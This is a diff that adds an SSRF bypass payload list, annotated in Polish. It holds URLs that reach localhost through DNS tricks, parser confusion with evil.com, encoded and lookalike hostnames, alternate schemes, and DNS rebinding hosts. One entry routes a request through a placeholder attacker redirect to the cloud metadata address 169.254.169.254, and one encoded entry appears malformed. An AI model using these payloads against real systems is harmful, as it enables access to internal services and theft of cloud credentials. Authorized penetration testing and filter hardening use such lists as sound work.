@@ -1,0 +1,37 @@
+# === DNS-based bypass — domena wskazująca na 127.0.0.1 ===
+http://localtest.me/
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
+http://spoofed.burpcollaborator.net/
+
+# === Userinfo/host confusion (URL parser desync) ===
+http://expected.com@127.0.0.1/
+http://127.0.0.1#expected.com/
+http://127.0.0.1?expected.com/
+http://expected.com\@127.0.0.1/
+http://127.0.0.1.expected.com/
+http://expected.com.127.0.0.1.nip.io/
+
+# === Protocol confusion / smuggling ===
+http://foo@evil.com:80@127.0.0.1/
+http://evil.com\\@127.0.0.1/
+
+# === Redirect-based (302 follow) ===
+# Wymagana podmiana {{ATTACKER}} — endpoint atakującego zwraca 302 do internal
+http://{{ATTACKER}}/redirect?url=http://169.254.169.254/
+
+# === Punycode / IDN ===
+http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
+http://locаlhost/
+
+# === Double URL encoding ===
+http://%6c%6f%63%61%6c%68%6f%73%74/
+http://%2569%2570%2531/
+
+# === Wrapped schemes ===
+ldap://127.0.0.1/
+sftp://127.0.0.1/
+tftp://127.0.0.1/
+
+# === DNS rebinding ready ===
+http://7f000001.rebind.network/
+http://make-127-0-0-1-rr-{{ATTACKER}}.repeat.rebind.it/
